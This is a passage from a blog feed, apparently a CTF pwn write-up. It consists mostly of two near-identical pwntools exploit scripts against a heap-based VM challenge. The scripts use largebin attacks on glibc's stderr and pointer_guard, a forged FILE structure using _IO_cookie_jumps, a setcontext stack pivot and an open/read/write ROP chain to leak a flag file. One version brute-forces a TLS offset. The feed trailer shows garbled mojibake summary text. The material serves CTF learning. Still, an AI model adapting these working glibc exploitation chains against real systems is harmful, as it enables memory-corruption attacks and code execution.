function_">sendit</span>():</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;opcode\n&quot;</span>, pl)</span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + tls_offset + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger assert</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x500</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">offset = <span class="number">0x300740</span></span><br><span class="line">tls_offset = offset</span><br><span class="line">tls_offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">tls_offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(tls_offset))</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line"><span class="comment">#size(0x40f,0x500]</span></span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">1</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">2</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">3</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">4</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line">pl += <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendit</span>():</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;opcode\n&quot;</span>, pl)</span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + tls_offset + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger assert</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x500</span>)</span><br><span class="line">sendit()</span><br><span class="line">            r=p.recvuntil(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">flag = r+p.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">log.success(flag)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ËÆ≤Ê∞¥ËØæÔºåÊÅ∞Â§ßÁ±≥&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ê≤ôÁÆ±ÂºÄÂêØÔºåËÄÉËôëorw&lt;/p&gt;
&lt;p&gt;‰øùÊä§ÂÖ®ÂºÄ&lt;/p&gt;
&lt;h2 id=&quot;VMÂàÜÊûê&quot;&gt;&lt;a href=&quot;#VMÂàÜÊûê&quot; class=&quot;headerlink&quot; title=&quot;VMÂàÜÊûê&quot;&gt;&lt;/a&gt;VM</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>CISCN-2023ÂçäÂÜ≥ËµõÊ∏∏ËÆ∞</title>
    <link href="http://deepunk.icu/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0/"/>
    <id>http://deepunk.icu/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0/</id>
    <published>2023-06-12T11:14:12.000Z</published>
    <updated>2023-12-14T15:09:48.523Z</updated>
    
